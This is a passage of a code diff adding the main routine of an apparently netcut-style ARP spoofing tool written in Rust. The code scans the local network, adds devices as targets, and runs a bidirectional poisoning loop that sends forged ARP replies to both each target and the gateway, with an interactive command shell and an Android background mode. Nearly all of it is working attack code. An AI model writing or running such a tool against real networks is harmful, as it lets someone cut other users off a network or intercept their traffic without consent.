+                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
+            } else if msg.contains("PERMISSION_DENIED") {
+                output_permission_denied(json_mode);
+                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
+            } else {
+                output_internal_error(&msg, json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+            }
+        }
+    };
+    
+    let src_mac = match get_iface_mac(&args.iface) {
+        Ok(mac) => mac,
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("INTERFACE_NOT_FOUND") {
+                output_interface_not_found(&args.iface, json_mode);
+                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
+            } else if msg.contains("PERMISSION_DENIED") {
+                output_permission_denied(json_mode);
+                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
+            } else {
+                output_internal_error(&msg, json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+            }
+        }
+    };
+    
+    let src_ip = match get_iface_ipv4(&args.iface) {
+        Ok(ip) => ip,
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("INTERFACE_NOT_FOUND") {
+                output_interface_not_found(&args.iface, json_mode);
+                ExitCode::InterfaceNotFound.exit(Some(&format!("INTERFACE_NOT_FOUND|N/A|{}", msg)));
+            } else if msg.contains("PERMISSION_DENIED") {
+                output_permission_denied(json_mode);
+                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied"));
+            } else {
+                output_internal_error(&msg, json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+            }
+        }
+    };
+    
+    logger.log(&format!(
+        "Service starting: iface={} ifindex={} mac={} ip={}",
+        args.iface,
+        ifindex,
+        format_mac(&src_mac),
+        src_ip
+    ));
+
+    let running = Arc::new(AtomicBool::new(true));
+    let stop = Arc::new(AtomicBool::new(false));
+    let bans: Arc<Mutex<Vec<Ipv4Addr>>> = Arc::new(Mutex::new(Vec::new()));
+
+    // Signal handling
+    {
+        let running = running.clone();
+        let stop = stop.clone();
+
+        let mut signals = match Signals::new(&[SIGINT, SIGTERM]) {
+            Ok(s) => s,
+            Err(e) => {
+                output_internal_error(&e.to_string(), json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", e)));
+            }
+        };
+
+        thread::spawn(move || {
+            for signal in signals.forever() {
+                match signal {
+                    SIGINT => {
+                        eprintln!("\n[*] Received SIGINT (Ctrl+C), shutting down...");
+                        running.store(false, Ordering::SeqCst);
+                        stop.store(true, Ordering::Release);
+                        break;
+                    }
+                    SIGTERM => {
+                        eprintln!("[*] Received SIGTERM, shutting down...");
+                        running.store(false, Ordering::SeqCst);
+                        stop.store(true, Ordering::Release);
+                        break;
+                    }
+                    _ => unreachable!(),
+                }
+            }
+        });
+    }
+
+    // Android service mode
+    if args.android_service {
+        if let Some(parent_pid) = args.parent_pid {
+            eprintln!("[*] Android service mode enabled, monitoring parent PID: {}", parent_pid);
+            monitor_parent(parent_pid, &running, &stop);
+        } else {
+            output_invalid_argument("Missing --parent-pid for android service mode", json_mode);
+            ExitCode::InvalidArgument.exit(Some("INVALID_ARGUMENT|N/A|Android service requires --parent-pid"));
+        }
+    }
+
+    let timeout = Duration::from_secs(args.resolve_timeout);
+
+    // Resolve gateway
+    eprintln!("[*] Resolving gateway MAC...");
+    let gateway_mac = match resolve_mac(
+        &args.iface,
+        src_mac,
+        src_ip,
+        args.gateway,
+        ifindex,
+        timeout,
+        &stop,
+    ) {
+        Ok(mac) => mac,
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("MAC_RESOLUTION_FAILED") {
+                output_gateway_not_found(json_mode);
+                ExitCode::GatewayNotFound.exit(Some(&format!("GATEWAY_NOT_FOUND|{}|{}", args.gateway, msg)));
+            } else {
+                output_internal_error(&msg, json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+            }
+        }
+    };
+    eprintln!("[+] Gateway MAC: {}", format_mac(&gateway_mac));
+
+    // Load persisted targets - FIXED
+    let initial_targets = match load_targets(
+        &args.persist_file,
+        &args.iface,
+        src_mac,
+        src_ip,
+        ifindex,
+        timeout,
+        &stop,
+    ) {
+        Ok((targets, bans_list)) => {
+            // Store the bans in the mutex
+            *bans.lock().unwrap() = bans_list;
+            targets // Return only the targets
+        }
+        Err(e) => {
+            eprintln!("[!] Failed to load persisted targets: {}", e);
+            HashMap::new() // Return empty HashMap
+        }
+    };
+
+    let targets: Arc<Mutex<HashMap<Ipv4Addr, TargetInfo>>> = Arc::new(Mutex::new(initial_targets));
+
+    // Network scan on startup
+    if args.scan_on_start {
+        if let Some(scan_range) = args.scan_range {
+            eprintln!("[*] Scanning network range: {}", scan_range);
+            // Simple scan implementation
+            if let Ok(found) = scan_network(
+                &args.iface,
+                src_mac,
+                src_ip,
+                ifindex,
+                timeout,
+                &stop,
+            ) {
+                for ip in found {
+                    if let Ok(mac) = resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, Duration::from_secs(2), &stop) {
+                        if !targets.lock().unwrap().contains_key(&ip) {
+                            targets.lock().unwrap().insert(ip, TargetInfo {
+                                ip,
+                                mac,
+                                added_at: Instant::now(),
+                                packets_sent: 0,
+                            });
+                            output_target_added(ip, json_mode);
+                        }
+                    }
+                }
+            }
+        } else {
+            // Auto-scan the network
+            eprintln!("[*] Auto-scanning network...");
+            if let Ok(found) = scan_network(
+                &args.iface,
+                src_mac,
+                src_ip,
+                ifindex,
+                Duration::from_secs(10),
+                &stop,
+            ) {
+                for ip in found {
+                    if let Ok(mac) = resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, Duration::from_secs(2), &stop) {
+                        if !targets.lock().unwrap().contains_key(&ip) {
+                            targets.lock().unwrap().insert(ip, TargetInfo {
+                                ip,
+                                mac,
+                                added_at: Instant::now(),
+                                packets_sent: 0,
+                            });
+                            output_target_added(ip, json_mode);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Process initial targets from command line
+    for ip in args.initial_targets {
+        if targets.lock().unwrap().contains_key(&ip) {
+            output_already_exists(ip, json_mode);
+            continue;
+        }
+        
+        eprintln!("[*] Resolving initial target MAC for {}...", ip);
+        match resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, timeout, &stop) {
+            Ok(mac) => {
+                targets.lock().unwrap().insert(ip, TargetInfo {
+                    ip,
+                    mac,
+                    added_at: Instant::now(),
+                    packets_sent: 0,
+                });
+                output_target_added(ip, json_mode);
+                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
+            }
+            Err(e) => {
+                output_mac_resolution_failed(ip, json_mode);
+                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
+            }
+        }
+    }
+
+    // Create raw socket
+    let sock = match RawSock::new(ETH_P_ARP as u16) {
+        Ok(s) => s,
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("PERMISSION_DENIED") {
+                output_permission_denied(json_mode);
+                ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied to create raw socket"));
+            } else {
+                output_internal_error(&msg, json_mode);
+                ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+            }
+        }
+    };
+    
+    if let Err(e) = sock.bind_to_device(&args.iface) {
+        let msg = e.to_string();
+        if msg.contains("PERMISSION_DENIED") {
+            output_permission_denied(json_mode);
+            ExitCode::PermissionDenied.exit(Some("PERMISSION_DENIED|N/A|Permission denied to bind to device"));
+        } else {
+            output_internal_error(&msg, json_mode);
+            ExitCode::InternalError.exit(Some(&format!("INTERNAL_ERROR|N/A|{}", msg)));
+        }
+    }
+
+    // Output service started
+    output_service_started(Some(src_ip), json_mode);
+
+    // Create stats tracker
+    let stats = Arc::new(Stats::new());
+
+    // ... rest of the code remains the same ...
+
+    
+
+    // -------- Interactive Command Thread --------
+    let targets_clone = Arc::clone(&targets);
+    let running_clone = Arc::clone(&running);
+    let stop_clone = Arc::clone(&stop);
+    let bans_clone = Arc::clone(&bans);
+    let iface_clone = args.iface.clone();
+    let gateway_clone = args.gateway;
+    let src_mac_clone = src_mac;
+    let src_ip_clone = src_ip;
+    let ifindex_clone = ifindex;
+    let timeout_clone = timeout;
+    let gateway_mac_clone = gateway_mac;
+    let persist_file_clone = args.persist_file.clone();
+    let stats_clone = Arc::clone(&stats);
+    let json_mode_clone = json_mode;
+
+    thread::spawn(move || {
+        let stdin = std::io::stdin();
+        let mut input = String::new();
+        let is_tty = unsafe { libc::isatty(libc::STDIN_FILENO) == 1 };
+        
+        if is_tty {
+            eprintln!("[*] Service ready. Commands:");
+            eprintln!("  add <ip>                    - Add target");
+            eprintln!("  remove <ip>                 - Remove target");
+            eprintln!("  list                       - List targets");
+            eprintln!("  status                     - Show status");
+            eprintln!("  stats [ip]                 - Show statistics");
+            eprintln!("  flush                      - Remove all targets");
+            eprintln!("  scan                       - Scan network for devices");
+            eprintln!("  ban <ip>                   - Ban a device (permanent block)");
+            eprintln!("  unban <ip>                 - Unban a device");
+            eprintln!("  save                       - Save targets to file");
+            eprintln!("  load                       - Load targets from file");
+            eprintln!("  quit / exit                - Stop service");
+        } else {
+            eprintln!("[*] Service ready in background mode. Waiting for commands via stdin...");
+        }
+
+        while running_clone.load(Ordering::SeqCst) {
+            if is_tty {
+                eprint!("netcut> ");
+                let _ = std::io::stderr().flush();
+            }
+            
+            input.clear();
+            match stdin.read_line(&mut input) {
+                Ok(0) => {
+                    thread::sleep(Duration::from_millis(500));
+                    continue;
+                }
+                Ok(_) => {
+                    if input.trim().is_empty() {
+                        continue;
+                    }
+                }
+                Err(_) => {
+                    thread::sleep(Duration::from_millis(500));
+                    continue;
+                }
+            }
+
+            let parts: Vec<&str> = input.trim().split_whitespace().collect();
+            if parts.is_empty() { continue; }
+
+            match parts[0] {
+                "add" => {
+                    if parts.len() < 2 {
+                        output_invalid_argument("Missing IP address", json_mode_clone);
+                        eprintln!("Usage: add <ip>");
+                        continue;
+                    }
+                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
+                        // Check if banned
+                        if bans_clone.lock().unwrap().contains(&ip) {
+                            eprintln!("[!] {} is banned. Use 'unban' first.", ip);
+                            continue;
+                        }
+                        
+                        let already_exists = {
+                            let t = targets_clone.lock().unwrap();
+                            t.contains_key(&ip)
+                        };
+                        if already_exists {
+                            output_already_exists(ip, json_mode_clone);
+                            eprintln!("[!] {} is already in the target list.", ip);
+                            continue;
+                        }
+                        
+                        eprintln!("[*] Resolving MAC for {}...", ip);
+                        match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip, ifindex_clone, timeout_clone, &stop_clone) {
+                            Ok(mac) => {
+                                let mut t = targets_clone.lock().unwrap();
+                                t.insert(ip, TargetInfo {
+                                    ip,
+                                    mac,
+                                    added_at: Instant::now(),
+                                    packets_sent: 0,
+                                });
+                                output_target_added(ip, json_mode_clone);
+                                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
+                            }
+                            Err(e) => {
+                                output_mac_resolution_failed(ip, json_mode_clone);
+                                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
+                            }
+                        }
+                    } else {
+                        output_invalid_argument(parts[1], json_mode_clone);
+                        eprintln!("[!] Invalid IP address.");
+                    }
+                }
+                "remove" => {
+                    if parts.len() < 2 {
+                        output_invalid_argument("Missing IP address", json_mode_clone);
+                        eprintln!("Usage: remove <ip>");
+                        continue;
+                    }
+                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
+                        let info = {
+                            let mut t = targets_clone.lock().unwrap();
+                            t.remove(&ip)
+                        };
+                        
+                        if let Some(info) = info {
+                            eprintln!("[*] Removing {} and restoring ARP...", ip);
+                            
+                            if let Ok(temp_sock) = RawSock::new(ETH_P_ARP as u16) {
+                                aggressive_restore(
+                                    &temp_sock,
+                                    ifindex_clone,
+                                    &vec![(ip, info.mac)],
+                                    gateway_clone,
+                                    gateway_mac_clone,
+                                    &iface_clone,
+                                    src_mac_clone,
+                                    src_ip_clone,
+                                );
+                            } else {
+                                eprintln!("[!] Failed to create temporary socket for restoration.");
+                            }
+                            
+                            output_target_removed(ip, json_mode_clone);
+                            eprintln!("[+] Removed {} and restored ARP.", ip);
+                        } else {
+                            output_target_not_found(ip, json_mode_clone);
+                            eprintln!("[!] {} is not in the target list.", ip);
+                        }
+                    } else {
+                        output_invalid_argument(parts[1], json_mode_clone);
+                        eprintln!("[!] Invalid IP address.");
+                    }
+                }
+                "flush" => {
+                    let targets_to_remove = {
+                        let t = targets_clone.lock().unwrap();
+                        t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
+                    };
+                    
+                    if targets_to_remove.is_empty() {
+                        output_success("No targets to flush", None, json_mode_clone);
+                        eprintln!("[*] No targets to flush.");
+                        continue;
+                    }
+                    
+                    eprintln!("[*] Flushing all {} targets...", targets_to_remove.len());
+                    
+                    if let Ok(temp_sock) = RawSock::new(ETH_P_ARP as u16) {
+                        aggressive_restore(
+                            &temp_sock,
+                            ifindex_clone,
+                            &targets_to_remove,
+                            gateway_clone,
+                            gateway_mac_clone,
+                            &iface_clone,
+                            src_mac_clone,
+                            src_ip_clone,
+                        );
+                    }
+                    
+                    {
+                        let mut t = targets_clone.lock().unwrap();
+                        t.clear();
+                    }
+                    
+                    if json_mode_clone {
+                        println!(r#"{{"code":111,"status":"FLUSH_COMPLETE","ip":"N/A","message":"Flushed {} targets"}}"#, targets_to_remove.len());
+                    } else {
+                        println!("111|FLUSH_COMPLETE|N/A|Flushed {} targets", targets_to_remove.len());
+                    }
+                    eprintln!("[+] Flushed all targets.");
+                }
+                "list" => {
+                    let t = targets_clone.lock().unwrap();
+                    if t.is_empty() {
+                        output_success("No targets currently added", None, json_mode_clone);
+                        eprintln!("[*] No targets currently added.");
+                    } else {
+                        if json_mode_clone {
+                            let mut json = String::from(r#"{"targets":["#);
+                            for (ip, info) in t.iter() {
+                                json.push_str(&format!(
+                                    r#"{{"ip":"{}","mac":"{}","packets":{}}},"#,
+                                    ip,
+                                    format_mac(&info.mac),
+                                    info.packets_sent
+                                ));
+                            }
+                            json.pop();
+                            json.push_str("]}");
+                            println!("{}", json);
+                        } else {
+                            let ips: Vec<String> = t.keys().map(|ip| ip.to_string()).collect();
+                            println!("0|TARGET_LIST|{}|{}", ips.join(","), t.len());
+                        }
+                        
+                        eprintln!("[*] Current targets:");
+                        for (ip, info) in t.iter() {
+                            eprintln!("  - {} ({}) [packets: {}]", 
+                                ip, 
+                                format_mac(&info.mac),
+                                info.packets_sent
+                            );
+                        }
+                    }
+                }
+                "status" => {
+                    let t = targets_clone.lock().unwrap();
+                    let b = bans_clone.lock().unwrap();
+                    output_success(&format!("Service running | Targets: {} | Bans: {}", t.len(), b.len()), None, json_mode_clone);
+                    eprintln!("[*] Service is running. Active targets: {}, Banned devices: {}", t.len(), b.len());
+                }
+                "stats" => {
+                    if parts.len() >= 2 {
+                        if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
+                            if let Some(stats_data) = stats_clone.get_stats(ip) {
+                                if json_mode_clone {
+                                    println!(r#"{{"ip":"{}","packets_sent":{},"uptime":{},"first_seen":{}}}"#,
+                                        ip,
+                                        stats_data.packets_sent,
+                                        stats_data.first_seen.elapsed().as_secs(),
+                                        stats_data.first_seen.elapsed().as_secs()
+                                    );
+                                } else {
+                                    println!("0|STATS|{}|Packets: {} | Uptime: {}s", 
+                                        ip,
+                                        stats_data.packets_sent,
+                                        stats_data.first_seen.elapsed().as_secs()
+                                    );
+                                }
+                            } else {
+                                output_target_not_found(ip, json_mode_clone);
+                            }
+                        } else {
+                            output_invalid_argument(parts[1], json_mode_clone);
+                        }
+                    } else {
+                        let all_stats = stats_clone.get_all_stats();
+                        if all_stats.is_empty() {
+                            output_success("No stats available", None, json_mode_clone);
+                        } else {
+                            let total_packets: u64 = all_stats.values().map(|s| s.packets_sent).sum();
+                            if json_mode_clone {
+                                let mut json = String::from(r#"{"stats":["#);
+                                for (ip, stats_data) in all_stats {
+                                    json.push_str(&format!(
+                                        r#"{{"ip":"{}","packets":{},"uptime":{}}},"#,
+                                        ip,
+                                        stats_data.packets_sent,
+                                        stats_data.first_seen.elapsed().as_secs()
+                                    ));
+                                }
+                                json.pop();
+                                json.push_str(&format!(r#"],"total_packets":{}}}"#, total_packets));
+                                println!("{}", json);
+                            } else {
+                                println!("0|STATS|ALL|Total packets: {} | Targets: {}", 
+                                    total_packets,
+                                    all_stats.len()
+                                );
+                            }
+                        }
+                    }
+                }
+                "scan" => {
+                    eprintln!("[*] Scanning network for devices...");
+                    if let Ok(found) = scan_network(
+                        &iface_clone,
+                        src_mac_clone,
+                        src_ip_clone,
+                        ifindex_clone,
+                        Duration::from_secs(10),
+                        &stop_clone,
+                    ) {
+                        let new_targets: Vec<Ipv4Addr> = found
+                            .into_iter()
+                            .filter(|ip| {
+                                !targets_clone.lock().unwrap().contains_key(ip)
+                            })
+                            .collect();
+                        
+                        for ip in new_targets {
+                            if let Ok(mac) = resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip, ifindex_clone, Duration::from_secs(2), &stop_clone) {
+                                targets_clone.lock().unwrap().insert(ip, TargetInfo {
+                                    ip,
+                                    mac,
+                                    added_at: Instant::now(),
+                                    packets_sent: 0,
+                                });
+                                output_target_added(ip, json_mode_clone);
+                            }
+                        }
+                        
+                        let count = targets_clone.lock().unwrap().len();
+                        if json_mode_clone {
+                            println!(r#"{{"code":112,"status":"SCAN_COMPLETE","ip":"N/A","message":"Scan complete. Total targets: {}"}}"#, count);
+                        } else {
+                            println!("112|SCAN_COMPLETE|N/A|Scan complete. Total targets: {}", count);
+                        }
+                    }
+                }
+                "ban" => {
+                    if parts.len() < 2 {
+                        output_invalid_argument("Missing IP address", json_mode_clone);
+                        eprintln!("Usage: ban <ip>");
+                        continue;
+                    }
+                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
+                        let mut b = bans_clone.lock().unwrap();
+                        if b.contains(&ip) {
+                            eprintln!("[!] {} is already banned.", ip);
+                            continue;
+                        }
+                        
+                        // Remove from targets if present
+                        let was_target = {
+                            let mut t = targets_clone.lock().unwrap();
+                            t.remove(&ip).is_some()
+                        };
+                        
+                        if was_target {
+                            eprintln!("[*] {} was a target. Removing and banning...", ip);
+                        }
+                        
+                        b.push(ip);
+                        output_ban_added(ip, json_mode_clone);
+                        eprintln!("[+] {} is now banned from the network.", ip);
+                    } else {
+                        output_invalid_argument(parts[1], json_mode_clone);
+                    }
+                }
+                "unban" => {
+                    if parts.len() < 2 {
+                        output_invalid_argument("Missing IP address", json_mode_clone);
+                        eprintln!("Usage: unban <ip>");
+                        continue;
+                    }
+                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
+                        let mut b = bans_clone.lock().unwrap();
+                        if let Some(pos) = b.iter().position(|&x| x == ip) {
+                            b.remove(pos);
+                            output_ban_removed(ip, json_mode_clone);
+                            eprintln!("[+] {} is no longer banned.", ip);
+                        } else {
+                            output_target_not_found(ip, json_mode_clone);
+                            eprintln!("[!] {} is not banned.", ip);
+                        }
+                    } else {
+                        output_invalid_argument(parts[1], json_mode_clone);
+                    }
+                }
+                "save" => {
+                    let t = targets_clone.lock().unwrap();
+                    let b = bans_clone.lock().unwrap();
+                    if let Err(e) = save_targets(&t, &b, &persist_file_clone) {
+                        output_internal_error(&e.to_string(), json_mode_clone);
+                        eprintln!("[!] Failed to save targets: {}", e);
+                    } else {
+                        if json_mode_clone {
+                            println!(r#"{{"code":113,"status":"SAVE_COMPLETE","ip":"N/A","message":"Saved {} targets"}}"#, t.len());
+                        } else {
+                            println!("113|SAVE_COMPLETE|N/A|Saved {} targets", t.len());
+                        }
+                    }
+                }
+                "load" => {
+                    if let Ok((loaded_targets, loaded_bans)) = load_targets(
+                        &persist_file_clone,
+                        &iface_clone,
+                        src_mac_clone,
+                        src_ip_clone,
+                        ifindex_clone,
+                        timeout_clone,
+                        &stop_clone,
+                    ) {
+                        {
+                            let mut t = targets_clone.lock().unwrap();
+                            for (ip, info) in loaded_targets {
+                                t.insert(ip, info);
+                            }
+                        }
+                        {
+                            let mut b = bans_clone.lock().unwrap();
+                            *b = loaded_bans;
+                        }
+                        let count = targets_clone.lock().unwrap().len();
+                        if json_mode_clone {
+                            println!(r#"{{"code":114,"status":"LOAD_COMPLETE","ip":"N/A","message":"Loaded {} targets"}}"#, count);
+                        } else {
+                            println!("114|LOAD_COMPLETE|N/A|Loaded {} targets", count);
+                        }
+                    } else {
+                        output_internal_error("Failed to load targets", json_mode_clone);
+                    }
+                }
+                "quit" | "exit" => {
+                    output_success("Shutting down service", None, json_mode_clone);
+                    eprintln!("[*] Shutting down...");
+                    running_clone.store(false, Ordering::SeqCst);
+                    stop_clone.store(true, Ordering::Release);
+                    break;
+                }
+                _ => {
+                    output_invalid_argument(parts[0], json_mode_clone);
+                    eprintln!("[!] Unknown command. Available commands:");
+                    eprintln!("  add, remove, list, status, stats, flush");
+                    eprintln!("  scan, ban, unban, save, load, quit");
+                }
+            }
+        }
+    });
+
+    // -------- Bidirectional Poisoning Loop --------
+    let interval = Duration::from_millis(1000 / args.rate.max(1));
+    eprintln!("[*] Bidirectional poisoning engine active. Waiting for targets...");
+
+    while running.load(Ordering::SeqCst) {
+        if stop.load(Ordering::Acquire) {
+            break;
+        }
+
+        let targets_snapshot = {
+            let t = targets.lock().unwrap();
+            t.iter()
+                .filter(|(ip, _)| {
+                    // Check if target is banned
+                    let b = bans.lock().unwrap();
+                    !b.contains(ip)
+                })
+                .map(|(ip, info)| (*ip, info.mac))
+                .collect::<Vec<_>>()
+        };
+
+        if targets_snapshot.is_empty() {
+            thread::sleep(Duration::from_secs(1));
+            continue;
+        }
+
+        for (ip, mac) in targets_snapshot {
+            // 1. Poison Target: Tell target the gateway is at our MAC
+            let poison_target = build_arp_reply(src_mac, mac, args.gateway, ip);
+            let _ = sock.send_frame(poison_target.as_bytes(), ifindex);
+            
+            // 2. Poison Gateway: Tell gateway the target is at our MAC
+            let poison_gateway = build_arp_reply(src_mac, gateway_mac, ip, args.gateway);
+            let _ = sock.send_frame(poison_gateway.as_bytes(), ifindex);
+            
+            // Record stats
+            stats.record_send(ip);
+        }
+        
+        thread::sleep(interval);
+    }
+
+    // -------- Aggressive Bidirectional Restore --------
+    let targets_snapshot = {
+        let t = targets.lock().unwrap();
+        t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
+    };
+
+    if !targets_snapshot.is_empty() {
+        aggressive_restore(
+            &sock,
+            ifindex,
+            &targets_snapshot,
+            args.gateway,
+            gateway_mac,
+            &args.iface,
+            src_mac,
+            src_ip,
+        );
+    }
+
+    // Save targets on exit
+    let t = targets.lock().unwrap();
+    let b = bans.lock().unwrap();
+    let _ = save_targets(&t, &b, &args.persist_file);
+
+    output_success("Service stopped", None, json_mode);
+    eprintln!("[+] Restore complete. Exiting.");
+    ExitCode::Success.exit(Some("SUCCESS|N/A|Service stopped successfully"));
+}
